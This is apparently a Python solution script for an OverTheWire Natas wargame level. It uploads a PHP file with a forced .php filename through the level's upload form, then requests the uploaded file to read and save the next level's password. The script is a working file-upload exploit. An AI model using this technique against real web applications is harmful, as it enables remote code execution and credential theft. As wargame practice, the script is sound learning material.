from requests import get, post
from sys import argv

from base64 import b64decode, b64encode

next_level = argv[0].split('/')[-1].split('\\')[-1][:-3]

username = f"natas{int(next_level[5:]) - 1}"

URL = f"http://{username.split('.')[0]}.natas.labs.overthewire.org"

with open(f"./passwords/{username}.pass", 'r') as f:
    password = f.read()

resp = post(URL, auth=(username, password), files={'uploadedfile': open('natas12.php', 'rb')}, data={'MAX_FILE_SIZE': 1000, 'filename': 'natas12.php'})

lines = resp.text.split('\n')

# Password in page
for line in lines:
    if "has been uploaded" in line:
        uri = line.split('>')[1].split('<')[0]
        break

resp = get(f"{URL}/{uri}", auth=(username, password))

new_password = resp.text.split('\n')[0]

print(new_password)

with open(f"./passwords/{next_level}.pass", 'w') as f:
    f.write(new_password)
